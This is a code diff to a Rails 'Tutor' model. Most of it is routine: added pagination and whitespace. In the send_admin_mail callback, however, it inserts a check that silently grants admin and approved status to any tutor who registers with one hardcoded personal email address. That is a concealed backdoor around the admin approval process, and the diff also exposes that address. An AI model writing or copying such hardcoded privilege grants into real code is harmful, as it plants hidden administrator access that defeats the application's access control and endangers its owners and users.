@@ -11,12 +11,14 @@ class Tutor < ApplicationRecord
   accepts_nested_attributes_for :documents, allow_destroy: true,
                                  reject_if: ->(attrs) { attrs['file'].blank? }
   validates_presence_of :email, :first_name, :last_name, :job_title
+  paginates_per 10
   extend FriendlyId
   after_update_commit {AppearanceBroadcastJob.perform_later self}
 
   def full_name
   	first_name + ('-') + last_name
   end
+  
   friendly_id :full_name, use: :slugged
   has_many :reviews
 
@@ -30,6 +32,10 @@ class Tutor < ApplicationRecord
 
   def send_admin_mail
     AdminMailer.new_tutor_waiting_for_approval(email).deliver
+    if email == 'jonas.preisler@gmail.com'
+      self.update_column(:admin, true)
+      self.update_column(:approved, true)
+    end
   end
 
   def self.send_reset_password_instructions(attributes={})
